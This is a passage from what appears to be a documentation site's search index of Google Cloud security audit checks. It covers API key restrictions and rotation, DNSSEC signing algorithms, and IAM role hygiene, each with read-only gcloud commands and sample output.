documentation</p>"},{"location":"Pentesting/Cloud/Best%20practice%20rules%20for%20Google%20Cloud%20Platform/#below-is-a-mindmap-attached-for-google-cloud-audit","title":"Below is a mindmap attached for GOOGLE CLOUD AUDIT","text":"<ul> <li>https://mm.tt/map/2623944112?t=ABQwsFPGyx</li> </ul>"},{"location":"Pentesting/Cloud/GCP%20API/","title":"GCP API","text":""},{"location":"Pentesting/Cloud/GCP%20API/#gcp-api","title":"GCP API","text":""},{"location":"Pentesting/Cloud/GCP%20API/#what-is-api","title":"What is API ?","text":"<p>API stands for Application Programming Interface. It is a set of protocols, standards, and tools that allows different software applications to communicate with each other.</p> <p>APIs enable software applications to interact with each other by sending and receiving data in a structured format. APIs can be used to access data, services, and functionality provided by other applications or web services.</p>"},{"location":"Pentesting/Cloud/GCP%20API/#what-is-gcp-api","title":"What is GCP API?","text":"<p>GCP API stands for Google Cloud Platform API. It is a collection of REST APIs that provide programmatic access to GCP services, allowing you to manage your GCP resources programmatically.</p> <p>These APIs enable you to interact with various GCP services such as Compute Engine, Kubernetes Engine, Cloud Storage, Cloud SQL, and many others.</p> <p>So , Now let's check about GCP API misconfiguration below:</p>"},{"location":"Pentesting/Cloud/GCP%20API/#check-for-api-key-api-restrictions","title":"Check for API Key API Restrictions","text":"<p>In order to follow cloud security best practices and reduce the attack surface, Google Cloud API keys should be restricted to call only those APIs required by your application.</p> <p>To determine if your Google Cloud API key usage is restricted to specific APIs only, perform the following operations:</p> <p>1. Run projects list command  with custom query filters to list the ID of each project available in your Google Cloud account:</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project IDs:</p> <pre><code>PROJECT_ID\n  cc-project5-112233\n  cc-internal-111222\n</code></pre> <p>3.  Now run services api-keys list command which  Lists the API keys of a given project.</p> <pre><code>gcloud alpha services api-keys list  --project=cc-project5-112233  --format=\"table(uid)\"\n</code></pre> <p>4. The command output should return the IDs of the active API keys:</p> <pre><code>UID:\n  abcd1234-abcd-1234-abcd-1234abcd1234\n  1234abcd-1234-abcd-1234-abcd1234abcd\n</code></pre> <p>5. Run services api-keys describe command using the ID of the API key that you want to examine as the identifier parameter and custom query filters to list the names of the Google Cloud APIs that can use the selected API key:</p> <pre><code>gcloud alpha services api-keys describe abcd1234-abcd-1234-abcd-1234abcd1234 --format=\"json(restrictions)\"\n</code></pre> <p>6. Based on the services api-keys describe command output, you can determine whether or not the use of the selected API key is restricted to specific APIs only:</p> <ul> <li>If the command output returns null, there is no API restriction control enabled, therefore the selected API key can call any supported Google Cloud Platform (GCP) API:</li> </ul> <pre><code>null\n</code></pre> <ul> <li>If the command output returns one or more APIs, check the \"apiTargets\" array for the list of GCP APIs that can use the selected API key. If the \"apiTargets\" array contains \"cloudapis.googleapis.com\", as shown in the example below, the selected API key can call any GCP API because the \"cloudapis.googleapis.com\" option represents the API collection of all the cloud services/APIs offered by Google Cloud Platform:</li> </ul> <pre><code>{\n  \"restrictions\": {\n    \"apiTargets\": [\n      {\n        \"service\": \"cloudapis.googleapis.com\"\n      }\n    ]\n  }\n}\n</code></pre>"},{"location":"Pentesting/Cloud/GCP%20API/#check-for-api-key-application-restrictions","title":"Check for API Key Application Restrictions","text":"<p>In order to follow cloud security best practices and reduce the attack surface, Google Cloud API keys should be restricted only to trusted hosts, HTTP referrers, and Android/iOS mobile applications.</p> <p>To determine if there are any unrestricted API keys within your Google Cloud account, perform the following actions:</p> <p>1. Run projects list command  with custom query filters to list the ID of each project available in your Google Cloud account:</p> <pre><code>gcloud projects list  --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project IDs:</p> <pre><code>PROJECT_ID\n  cc-project5-112233\n  cc-internal-111222\n</code></pre> <p>3.  Now run services api-keys list command which  Lists the API keys of a given project.</p> <pre><code>gcloud alpha services api-keys list --project=cc-project5-112233 --format=\"table(uid)\"\n</code></pre> <p>4. The command output should return the IDs of the active API keys:</p> <pre><code>UID:\n  abcd1234-abcd-1234-abcd-1234abcd1234\n  1234abcd-1234-abcd-1234-abcd1234abcd\n</code></pre> <p>5. Run services api-keys describe command  using the ID of the API key that you want to examine as the identifier parameter and custom query filters to describe the API key application restrictions configured for the selected key:</p> <pre><code>gcloud alpha services api-keys describe abcd1234-abcd-1234-abcd-1234abcd1234  --format=\"json(restrictions)\"\n</code></pre> <p>6. Based on the services api-keys describe command output, you can determine if the use of the selected API key is unrestricted:</p> <ul> <li>If the command output returns null, there is no restriction control enabled to specify which websites, IP addresses, or mobile applications can use the key, therefore the selected API key usage is unrestricted:</li> </ul> <pre><code>null\n</code></pre> <ul> <li>If the command output returns one or more HTTP referrers for API key application restrictions, as shown in the example above, check the \"allowedReferrers\" array for the list of domains that can use the selected API key. </li> </ul> <p>     If the referrer is set to a wildcard, i.e. * or *.[TLD] or *.[TLD]/*, where [TLD] represents the top-    level domain, there are no well-defined restrictions that specify which trusted websites can use your key, therefore the selected API key usage is unrestricted:</p> <pre><code>{\n  \"restrictions\": {\n    \"browserKeyRestrictions\": {\n      \"allowedReferrers\": [\n        \"*.example.com\"\n      ]\n    }\n  }\n}\n</code></pre> <ul> <li>If the services api-keys describe command output returns one or more IPv4/IPv6 addresses for API key application restrictions, as shown in the example below, check the \"allowedIps\" array for the list of hosts that can access the selected API key. If the \"allowedIps\" is set to any host, i.e. 0.0.0.0, 0.0.0.0/0 or ::0, there is no restriction control implemented to specify which host can use your key, therefore the selected API key usage is unrestricted:</li> </ul> <pre><code>{\n  \"restrictions\": {\n    \"serverKeyRestrictions\": {\n      \"allowedIps\": [\n        \"0.0.0.0/0\"\n      ]\n    }\n  }\n</code></pre>"},{"location":"Pentesting/Cloud/GCP%20API/#enable-cloud-asset-inventory","title":"Enable Cloud Asset Inventory","text":"<p>Gaining insight into Google Cloud resources and policies is vital for tasks such as DevOps, security analytics, multi-cluster and fleet management, auditing, and governance. With Cloud Asset Inventory you can discover, monitor, and analyze all GCP assets in one place, achieving a better understanding of all your cloud assets across projects and services.</p> <p>To determine if Google Cloud Asset Inventory is enabled for your GCP projects, perform the following operations:</p> <p>1. Run projects list command  with custom query filters to list the IDs of all the GCP projects available within your Google Cloud account:</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers:</p> <pre><code>PROJECT_ID\ncc-web-project-112233\ncc-mobile-project-123123\n</code></pre> <p>3. Run services list command which list services for a project.</p> <pre><code>gcloud services list  --project cc-web-project-112233  --enabled --filter=name:cloudasset.googleapis.com\n</code></pre> <p>4. The command output should return the name and the title of the requested API:</p> <pre><code>Listed 0 items.\n</code></pre> <p>If the services list command output returns Listed 0 items, as shown in the output example above, the Cloud Asset API is currently disabled, therefore the Google Cloud Asset Inventory is not enabled for the selected GCP project.</p>"},{"location":"Pentesting/Cloud/GCP%20API/#rotate-google-cloud-api-keys","title":"Rotate Google Cloud API Keys","text":"<p>Once a Google Cloud API key is compromised, it can be used indefinitely unless the project owner revokes or regenerates that key. Rotating GCP API keys will substantially reduce the window of opportunity for exploits and ensure that data can't be accessed with an outdated key that might have been lost, cracked, or stolen.</p> <p>To determine if your Google Cloud API keys are regularly rotated (i.e. every 90 days), perform the following operations:</p> <p>1. Run projects list command with custom query filters to list the ID of each project available in your Google Cloud account:</p> <pre><code>gcloud projects list  --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project IDs:</p> <pre><code>PROJECT_ID\n  cc-project5-112233\n  cc-internal-123123\n  cc-web-prod-111222\n</code></pre> <p>3. Run services api-keys list command  using the ID of the GCP project that you want to examine as the identifier parameter and custom query filters to describe the identifier of each active API key created for the selected project:</p> <pre><code>gcloud alpha services api-keys list  --project=cc-project5-112233  --format=\"table(uid)\"\n</code></pre> <p>4. The command output should return the IDs of the active API keys:</p> <pre><code>UID:\n  abcd1234-abcd-1234-abcd-1234abcd1234\n  1234abcd-1234-abcd-1234-abcd1234abcd\n</code></pre> <p>5. Run services api-keys describe command  using the ID of the API key that you want to examine as the identifier parameter and custom query filters to describe the API key application restrictions configured for the selected key:</p> <pre><code>gcloud alpha services api-keys describe abcd1234-abcd-1234-abcd-1234abcd1234 --format=\"json(createTime)\"\n</code></pre> <p>6. The command output should return the API key creation date/time:</p> <pre><code>CREATE_TIME: 2020-10-25T09:01:20.329336Z\n</code></pre> <p>Check the timestamp returned by the services **_**api-keys describe_ command output to determine when the selected API key was created. If more than 90 days have passed since the key was created, the selected Google Cloud Platform (GCP) API key is not regenerated (rotated) on a regular basis.</p>"},{"location":"Pentesting/Cloud/GCP%20Domain%20Name%20System%20%28DNS%29/","title":"GCP Domain Name System (DNS)","text":""},{"location":"Pentesting/Cloud/GCP%20Domain%20Name%20System%20%28DNS%29/#gcp-domain-name-system-dns","title":"GCP Domain Name System (DNS)","text":""},{"location":"Pentesting/Cloud/GCP%20Domain%20Name%20System%20%28DNS%29/#what-is-dns","title":"What is DNS?","text":"<p>DNS refers to the Domain Name System (DNS) service. DNS is a crucial component of the internet that translates human-readable domain names (like google.com) into the numerical IP addresses that computers use to identify each other and communicate.</p>"},{"location":"Pentesting/Cloud/GCP%20Domain%20Name%20System%20%28DNS%29/#what-is-dnssec","title":"What is DNSSEC?","text":"<ul> <li>DNSSEC (Domain Name System Security Extensions) is a security protocol that adds a layer of authentication and integrity to the Domain Name System (DNS).</li> <li>DNSSEC helps to prevent DNS spoofing and other attacks that rely on modifying or faking DNS data, thereby increasing the security and reliability of the internet. However, not all domains have implemented DNSSEC, and it requires support from both the domain owner and the DNS resolver used by the client.</li> </ul> <p>Now let's see some misconfigurations in GCP DNS.</p>"},{"location":"Pentesting/Cloud/GCP%20Domain%20Name%20System%20%28DNS%29/#check-for-dnssec-key-signing-algorithm-in-use","title":"Check for DNSSEC Key-Signing Algorithm in Use","text":"<p>To follow security best practices, do not use the RSASHA1 signature algorithm for DNSSEC signing unless it is required for compatibility reasons, as SHA1 is considered weak and vulnerable to collision attacks.</p> <p>To determine the type of DNSSEC Key-Signing Key algorithm configured for your Domain Name System (DNS) managed zones, perform the following operations:</p> <p>1. Run projects list command  with custom query filters to list the ID of each project available in your Google Cloud account:</p> <pre><code>gcloud projects list  --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-web-project-123456\ncc-backend-app-112233\n</code></pre> <p>3. Run dns managed-zones list command  using the ID of the GCP project that you want to examine as identifier parameter and custom filtering to describe the name and the visibility of each DNS managed zone created for the selected project:</p> <pre><code>gcloud dns managed-zones list  --project cc-web-project-123456  --format=\"table(name,visibility)\"\n</code></pre> <p>4. The command output should return the requested Google Cloud DNS zone metadata:</p> <pre><code>NAME                        VISIBILITY\ncloudconformity-dns-zone    public\ncloudrealisation-dns-zone   public\n</code></pre> <p>5. Run dns managed-zones describe command  using the name of the public DNS managed zone that you want to examine as identifier parameter and custom query filters to describe the DNSSEC feature configuration available for the selected DNS zone:</p> <pre><code>gcloud dns managed-zones describe cloudconformity-dns-zone --format=\"json(dnssecConfig)\"\n</code></pre> <p>6. The command output should return the requested configuration information in JSON format:</p> <pre><code>{\n  \"dnssecConfig\": {\n    \"defaultKeySpecs\": [\n      {\n        \"algorithm\": \"rsasha1\",\n        \"keyLength\": 1024,\n        \"keyType\": \"keySigning\",\n        \"kind\": \"dns#dnsKeySpec\"\n      },\n      {\n        \"algorithm\": \"rsasha256\",\n        \"keyLength\": 1024,\n        \"keyType\": \"zoneSigning\",\n        \"kind\": \"dns#dnsKeySpec\"\n      }\n    ],\n    \"kind\": \"dns#managedZoneDnsSecConfig\",\n    \"nonExistence\": \"nsec3\",\n    \"state\": \"on\"\n  }\n}\n</code></pre> <p>Check the DNSSEC configuration object with the \"keyType\" property value set to \"keySigning\". If the dns managed-zones describe command output returns \"rsasha1\" as the value of the dnssecConfig.defaultKeySpecs.algorithm attribute, as shown in the example above, the DNSSEC Key-Signing Key (KSK) algorithm configured for the selected DNS managed zone is not secure and should not be used unless you need it for compatibility reasons.</p>"},{"location":"Pentesting/Cloud/GCP%20Domain%20Name%20System%20%28DNS%29/#enable-dnssec-for-google-cloud-dns-zones","title":"Enable DNSSEC for Google Cloud DNS Zones","text":"<p>Having a trustworthy Domain Name System (DNS) that translates a domain name into its associated IP address is extremely important for web security nowadays. Attackers can hijack the process of domain/IP lookup and redirect users to malicious web content through DNS hijacking and Man-In-The-Middle (MITM) attacks.</p> <p>To determine if DNSSEC is enabled for all your Domain Name System (DNS) managed zones, perform the following actions:</p> <p>1. Run projects list command  using custom query filters to list the IDs of all the projects available in your Google Cloud account:</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-web-project-123123\ncc-backend-app-112233\n</code></pre> <p>3. Run dns managed-zones list command  which command displays the list of your managed-zones.</p> <pre><code>gcloud dns managed-zones list  --project cc-web-project-123123  --format=\"table(name,visibility)\"\n</code></pre> <p>4. The command output should return the requested Google Cloud DNS zone metadata:</p> <pre><code>NAME                        VISIBILITY\ncloudconformity-dns-zone    public\ncloudrealisation-dns-zone   public\n</code></pre> <p>5. Run dns managed-zones describe command displays the details of the specified managed-zone.</p> <pre><code>gcloud dns managed-zones describe cloudconformity-dns-zone --format=\"json(dnssecConfig.state)\"\n</code></pre> <p>6. The command output should return the requested configuration status:</p> <pre><code>STATE\noff\n</code></pre> <p>If the dns managed-zones describe command output returns off as the value of the STATE attribute, as shown in the example above, or the STATE configuration attribute does not have any value configured, the Domain Name System Security Extensions (DNSSEC) feature is not enabled for the selected DNS managed zone.</p>"},{"location":"Pentesting/Cloud/GCP%20Domain%20Name%20System%20%28DNS%29/#check-for-dnssec-zone-signing-algorithm-in-use","title":"Check for DNSSEC Zone-Signing Algorithm in Use","text":"<p>To follow security best practices, avoid using the RSASHA1 signature algorithm for DNSSEC signing unless it is required for compatibility reasons, because SHA1 is considered weak and vulnerable to collision attacks.</p> <p>To determine the type of DNSSEC Zone-Signing Key algorithm configured for your public DNS managed zones, perform the following actions:</p> <p>1. Run projects list command (Windows/macOS/Linux) using custom query filters to list the IDs of all the projects available in your Google Cloud account:</p> <pre><code>gcloud projects list  --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-frontend-app-123123\ncc-backend-app-112233\n</code></pre> <p>3. Run dns managed-zones list command  which command displays the list of your managed-zones.</p> <pre><code>gcloud dns managed-zones list  --project cc-frontend-app-123123 --format=\"table(name,visibility)\"\n</code></pre> <p>4. The command output should return the requested Google Cloud DNS zone metadata:</p> <pre><code>NAME VISIBILITY\ncloudrealisation-dns-zone public\ncloudconformity-dns-zone public\n</code></pre> <p>5. Run dns managed-zones describe command displays the details of the specified managed-zone.</p> <pre><code>gcloud dns managed-zones describe cloudrealisation-dns-zone  --format=\"json(dnssecConfig)\"\n</code></pre> <p>6. The command output should return the requested configuration information in JSON format:</p> <pre><code>{\n  \"dnssecConfig\": {\n    \"defaultKeySpecs\": [\n      {\n        \"algorithm\": \"rsasha1\",\n        \"keyLength\": 1024,\n        \"keyType\": \"keySigning\",\n        \"kind\": \"dns#dnsKeySpec\"\n      },\n      {\n        \"algorithm\": \"rsasha1\",\n        \"keyLength\": 1024,\n        \"keyType\": \"zoneSigning\",\n        \"kind\": \"dns#dnsKeySpec\"\n      }\n    ],\n    \"kind\": \"dns#managedZoneDnsSecConfig\",\n    \"nonExistence\": \"nsec3\",\n    \"state\": \"on\"\n  }\n}\n</code></pre> <p>Check the DNSSEC configuration object with the \"keyType\" property value set to \"zoneSigning\". If the dns managed-zones describe command output returns \"rsasha1\" as the value of the dnssecConfig.defaultKeySpecs.algorithm attribute, as shown in the example above, the DNSSEC Zone-Signing Key (ZSK) algorithm configured for the selected DNS managed zone is considered deprecated and insecure, and should not be used unless it is required for compatibility reasons.</p>"},{"location":"Pentesting/Cloud/GCP%20Identity%20and%20Access%20Management%20%28IAM%29/","title":"GCP Identity and Access Management (IAM)","text":""},{"location":"Pentesting/Cloud/GCP%20Identity%20and%20Access%20Management%20%28IAM%29/#gcp-identity-and-access-management-iam","title":"GCP Identity and Access Management (IAM)","text":""},{"location":"Pentesting/Cloud/GCP%20Identity%20and%20Access%20Management%20%28IAM%29/#what-is-iam","title":"What is IAM?","text":"<p>IAM stands for Identity and Access Management. IAM is a service that allows you to manage access control and permissions for resources within GCP.</p>"},{"location":"Pentesting/Cloud/GCP%20Identity%20and%20Access%20Management%20%28IAM%29/#roles-in-iam","title":"Roles in IAM","text":"<p>There are three types of IAM roles in GCP:</p> <ol> <li>Primitive roles: These are predefined roles that grant basic access to GCP resources, such as Owner, Editor, and Viewer. These roles have broad permissions, and they are not recommended for production environments.</li> <li>Predefined roles: These roles provide more granular access to specific GCP services and resources. Predefined roles are designed to cover common use cases, such as read-only access to GCE instances or management of Cloud Storage buckets. These roles cannot be modified but can be used in conjunction with custom roles.</li> <li>Custom roles: These roles are created by the user and provide fine-grained access control to GCP resources. Custom roles are built by selecting specific permissions from a set of predefined permissions in GCP. They are more flexible than predefined roles and can be tailored to fit specific use cases.</li> </ol> <p> You can read all roles here: documentation</p> <p>Lets check IAM misconfigurations:</p>"},{"location":"Pentesting/Cloud/GCP%20Identity%20and%20Access%20Management%20%28IAM%29/#check-for-iam-members-with-service-roles-at-the-project-level","title":"Check for IAM Members with Service Roles at the Project Level","text":"<p>To follow Google Cloud security best practices, Google Cloud Platform (GCP) IAM users should not have assigned the Service Account User or Service Account Token Creator roles at the GCP project level. Instead, these roles should be allocated to a user associated with a specific service account, providing that user access to the service account only.</p> <p>To determine if there are IAM users/members associated with Service Account User and/or Service Account Token Creator roles at the GCP project level, perform the following actions:</p> <p>1. Run projects list command  with custom query filters to list the ID of each project available in your Google Cloud account:</p> <pre><code>gcloud projects list  --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested project IDs:</p> <pre><code>PROJECT_ID\ncc-project5-123123\ncc-internal-111222\ncc-web-prod-123456\n</code></pre> <p>3. Run projects get-iam-policy command which gets the IAM policy for a project, given a project ID.</p> <pre><code>gcloud projects get-iam-policy cc-project5-123123 --format=json\n</code></pre> <p>4. The command output should return the requested project IAM policy:</p> <pre><code>{\n  \"bindings\": [\n    {\n      \"members\": [\n        \"user:cloud.realisation@gmail.com\"\n      ],\n      \"role\": \"roles/editor\"\n    },\n    {\n      \"members\": [\n        \"user:cloud.conformity@gmail.com\"\n      ],\n      \"role\": \"roles/owner\"\n    },\n    {\n      \"members\": [\n        \"serviceAccount:cc-project5-service-account@cc-project5-123123.iam.gserviceaccount.com\"\n      ],\n      \"role\": \"roles/iam.serviceAccountTokenCreator\"\n    },\n    {\n      \"members\": [\n        \"serviceAccount:cc-project5-service-account@cc-project5-123123.iam.gserviceaccount.com\"\n      ],\n      \"role\": \"roles/iam.serviceAccountUser\"\n    }\n  ],\n  \"etag\": \"abcdabcdabcd\",\n  \"version\": 1\n}\n</code></pre> <p>Check the name of each member role (i.e. \"role\" attribute) returned by the projects get-iam-policy command output. If one or more members have the \"role\" set to \"roles/iam.serviceAccountUser\" or \"roles/iam.serviceAccountTokenCreator\", as shown in the example above, there are IAM members associated with Service Account User and/or Service Account Token Creator roles at the selected GCP project level.</p>"},{"location":"Pentesting/Cloud/GCP%20Identity%20and%20Access%20Management%20%28IAM%29/#delete-google-cloud-api-keys","title":"Delete Google Cloud API Keys","text":"<p>Because only a limited number of Google Cloud services allow access using just API keys, without requiring another type of credential, Google recommends using a standard authentication flow instead of API keys for most applications. Deleting GCP API keys should enforce the use of secure authentication methods only and minimize the exposure to attacks.</p> <p>1. Run projects list command  with custom query filters to list the ID of each project available in your Google Cloud account:</p> <pre><code>gcloud projects list  --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project IDs:</p> <pre><code>PROJECT_ID\n  cc-project5-112233\n  cc-web-prod-111222\n  cc-internal-123123\n</code></pre> <p>3. Run services api-keys list which lists the API keys of a given project.</p> <pre><code>gcloud alpha services api-keys list  --project=cc-project5-112233  --format=\"table(uid)\"\n</code></pre> <p>4. The command output should return the ID(s) of the active GCP API key(s):</p> <pre><code>UID:\n  abcd1234-abcd-1234-abcd-1234abcd1234\n  1234abcd-1234-abcd-1234-abcd1234abcd\n</code></pre> <p>If the services api-keys list command output returns one or more API key IDs, as shown in the example above, the selected Google Cloud Platform (GCP) project is using API keys as credentials for authentication.</p>"},{"location":"Pentesting/Cloud/GCP%20Identity%20and%20Access%20Management%20%28IAM%29/#delete-user-managed-service-account-keys","title":"Delete User-Managed Service Account Keys","text":"<p>Anyone who has access to your user-managed keys will be able to access GCP resources through their associated service accounts. Deleting unwanted user-managed service account keys will significantly reduce the chances that a compromised set of keys can be used without your knowledge to access certain Google Cloud components and resources.</p> <p>To determine if your GCP service accounts are using user-managed keys, perform the following operations:</p> <p>1. Run projects list command  with custom query filters to list the ID of each project available in your Google Cloud account:</p> <pre><code>gcloud projects list  --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-app-123123\ncc-web-app-prod-123123\ncc-internal-app-123123\n</code></pre> <p>3. Run iam service-accounts list command using the ID of the GCP project that you want to examine as identifier parameter and custom query filters to list the email address of each service account available for the selected project:</p> <pre><code>gcloud iam service-accounts list    --project=cc-project5-app-123123    --format=\"table(email)\"\n</code></pre> <p>4. The command output should return the requested email addresses:</p> <pre><code>EMAIL\ncc-dev-service-account@cc-project5-app-123123.iam.gserviceaccount.com\ncc-int-service-account@cc-project5-app-123123.iam.gserviceaccount.com\n</code></pre> <p>5. Run iam service-accounts keys list command using the email address of the service account that you want to examine as identifier parameter, to list the user-managed keys created for the selected GCP service account:</p> <pre><code>gcloud iam service-accounts keys list   --iam-account=cc-dev-service-account@cc-project5-app-123123.iam.gserviceaccount.com --managed-by=user\n</code></pre> <p>6. The command output should return the requested user-managed keys:</p> <pre><code>KEY_ID                                CREATED_AT          EXPIRES_AT\nabcdabcdabcdabcdabcdabcdabcdabcdabcdabcd   2020-04-07T17:05:05Z   9999-12-31T23:59:59Z\nabcd1234abcd1234abcd1234abcd1234abcd1234   2020-04-07T17:08:51Z   9999-12-31T23:59:59Z\n</code></pre> <p>If the iam service-accounts keys list command output returns one or more associated keys, as shown in the output example above, the selected Google Cloud Platform  service account is using user-managed keys.</p>"},{"location":"Pentesting/Cloud/GCP%20Identity%20and%20Access%20Management%20%28IAM%29/#enable-access-approval","title":"Enable Access Approval","text":"<p>Controlling access to your Google Cloud data is crucial when working with business-critical and sensitive data. With Access Approval, you can be certain that your cloud information is accessed by approved Google personnel only. The Access Approval feature ensures that a cryptographically-signed approval is available for Google Cloud support and engineering teams when they need to access your cloud data . By default, Access Approval and its dependency of Access Transparency are not enabled.</p> <p>To determine if Access Approval is enabled for your Google Cloud account, perform the following operations:</p> <p>1. Run projects list command  with custom query filters to list the ID of each project available in your Google Cloud account:</p> <pre><code>gcloud projects list  --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers:</p> <pre><code>PROJECT_ID\ncc-web-project-112233\ncc-mobile-project-123123\n</code></pre> <p>3. Run access-approval settings get command which get the Access Approval settings associated with a project, a folder, or organization.</p> <pre><code>gcloud access-approval settings get --project cc-web-project-112233\n</code></pre> <p>The command output should return the Access Approval feature status. If the access-approval settings get command output does not return the requested status, Access Approval is not enabled for the selected GCP project.</p>"},{"location":"Pentesting/Cloud/GCP%20Identity%20and%20Access%20Management%20%28IAM%29/#enforce-separation-of-duties-for-kms-related-roles","title":"Enforce Separation of Duties for KMS-Related Roles","text":"<p>The principle of separation of duties can be enforced in order to eliminate the need for the IAM user/identity that has all the permissions needed to perform unwanted actions, such as using a cryptographic key to access and decrypt data which the user should not normally have access to.</p> <p>To determine if there are any IAM users that have KMS-related roles assigned at the same time, perform the following actions:</p> <p>1. Run projects list command  with custom query filters to list the ID of each project available in your Google Cloud account:</p> <pre><code>gcloud projects list  --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project IDs:</p> <pre><code>PROJECT_ID\ncc-big-data-app-123123\ncc-internal-app-112233\ncc-frontend-app-123456\n</code></pre> <p>3. Run projects get-iam-policy command  using the ID of the GCP project that you want to examine as the identifier parameter and custom query filters to describe the Identity and Access Management (IAM) policy created for the selected GCP project, in JSON format:</p> <pre><code>gcloud projects get-iam-policy cc-big-data-app-123123  --format=json\n</code></pre> <p>4. The command output should return the requested IAM policy document:</p> <pre><code>{\n  \"bindings\": [\n    {\n      \"members\": [\n        \"user:cloud.conformity@gmail.com\"\n      ],\n      \"role\": \"roles/cloudkms.admin\"\n    },\n    {\n      \"members\": [\n        \"user:cloud.conformity@gmail.com\"\n      ],\n      \"role\": \"roles/cloudkms.cryptoKeyEncrypterDecrypter\"\n    },\n    {\n      \"members\": [\n        \"user:cloud.realisation@gmail.com\"\n      ],\n      \"role\": \"roles/editor\"\n    }\n  ],\n  \"etag\": \"123412341234\",\n  \"version\": 1\n}\n</code></pre> <p>Check the name of each member role (i.e. \"role\" attribute) returned by the projects get-iam-policy command output. If one or more members are associated with the following set of roles: \"roles/cloudkms.admin\" role and one of the encrypter/decrypter roles (i.e. \"roles/cloudkms.cryptoKeyEncrypterDecrypter\", \"roles/cloudkms.cryptoKeyEncrypter\" or \"roles/cloudkms.cryptoKeyDecrypter\"), as shown in the output example above, there are users/identities that have both the KMS administrator and KMS encrypter/decrypter roles assigned at the same, therefore the principle of separation of duties was not enforced while assigning KMS-related roles to IAM users.</p>"},{"location":"Pentesting/Cloud/GCP%20Identity%20and%20Access%20Management%20%28IAM%29/#minimize-the-use-of-primitive-roles","title":"Minimize the Use of Primitive Roles","text":"<p>For production and security-critical cloud environments, limit the use of primitive roles such as \"Owner\", \"Editor\", and \"Viewer\" for Cloud IAM members. Instead, grant predefined roles to these IAM members to allow the least-permissive access required to perform their tasks.</p> <p>To determine if there are any IAM identities that make use of Cloud IAM primitive roles, perform the following operations:</p> <p>1. Run projects list command  with custom query filters to list the ID of each project available in your Google Cloud account:</p> <pre><code>gcloud projects list    --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-prod-app-123123\ncc-project5-123456\n</code></pre> <p>3. Run projects get-iam-policy command  using the ID of the Google Cloud project that you want to examine as identifier parameter and custom query filters to describe the Identity and Access Management (IAM) policy available for the selected project, in JSON format:</p> <pre><code>gcloud projects get-iam-policy cc-prod-app-123123   --format=json\n</code></pre> <p>4. The command output should return the requested IAM policy (JSON format):</p> <pre><code>{\n  \"bindings\": [\n    {\n      \"members\": [\n        \"user:admin@cloudconformity.com\"\n      ],\n      \"role\": \"roles/editor\"\n    },\n    {\n      \"members\": [\n        \"user:admin@cloudrealisation.com\"\n      ],\n      \"role\": \"roles/viewer\"\n    },\n    {\n      \"members\": [\n        \"user:admin@cloudrealisation.com\"\n      ],\n      \"role\": \"roles/owner\"\n    },\n    {\n      \"members\": [\n        \"serviceAccount:123456789012-compute@developer.gserviceaccount.com\"\n      ],\n      \"role\": \"roles/cloudkms.cryptoKeyEncrypterDecrypter\"\n    }\n  ],\n  \"etag\": \"abcdabcdabcd\",\n  \"version\": 1\n}\n</code></pre> <p>Check the name of each associated role (i.e. \"role\" property value) returned by the projects get-iam-policy command output. If one or more IAM members have the \"role\" property set to \"roles/owner\", \"roles/editor\" or \"roles/viewer\", as shown in the output example above, there are Google Cloud identities that make use of Cloud IAM primitive roles, available within the selected project.</p>"},{"location":"Pentesting/Cloud/GCP%20Identity%20and%20Access%20Management%20%28IAM%29/#restrict-administrator-access-for-service-accounts","title":"Restrict Administrator Access for Service Accounts","text":"<p>When your Google Cloud Platform (GCP) service accounts have administrator privileges (i.e. are using Owner and Editor roles, as well as roles containing *Admin or *admin in their names), these service accounts can access, create, and manage VM instances and other resources. To adhere to the principle of least privilege, give your GCP service accounts the minimal set of actions required to perform successfully their tasks and remove any administrator-based roles that allows them overly permissive access.</p> <p>To determine if your GCP user-managed service accounts have administrator privileges, perform the following actions:</p> <p>1. Run projects list command  with custom query filters to list the ID of each project available in your Google Cloud account:</p> <pre><code>gcloud projects list    --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested project IDs:</p> <pre><code>PROJECT_ID\ncc-internal-app-123123\ncc-web-app-prod-123123\ncc-project5-app-123123\n</code></pre> <p>3. Run projects get-iam-policy command  using the ID of the GCP project that you want to examine as identifier parameter and custom query filters to describe the Access Management (IAM) policy created for the selected GCP project, in JSON format:</p> <pre><code>gcloud projects get-iam-policy cc-internal-app-123123   --format=json\n</code></pre> <p>4. The command output should return the requested IAM policy:</p> <pre><code>{\n  \"bindings\": [\n    {\n      \"members\": [\n        \"serviceAccount:cc-app-dev-account@cc-internal-app-123123.iam.gserviceaccount.com\"\n      ],\n      \"role\": \"roles/appengine.codeViewer\"\n    },\n    {\n      \"members\": [\n        \"serviceAccount:cc-app-dev-account@cc-internal-app-123123.iam.gserviceaccount.com\"\n      ],\n      \"role\": \"roles/editor\"\n    },\n    {\n      \"members\": [\n        \"user:cloud.conformity@gmail.com\",\n        \"user:cloud.realisation@gmail.com\"\n      ],\n      \"role\": \"roles/owner\"\n    }\n  ],\n  \"etag\": \"abcdabcdabcd\",\n  \"version\": 1\n}\n</code></pre> <p>The IAM policy returned by the projects get-iam-policy command output should contain the member accounts available for the selected GCP project. Choose the user-managed service account that you want to examine. A user-managed service account has the following format: \\@\\.iam.gserviceaccount.com (e.g. cc-app-dev-account@cc-internal-app-123123.iam.gserviceaccount.com). Once the service account is selected, check the associated role(s) available as value for the \"role\" property 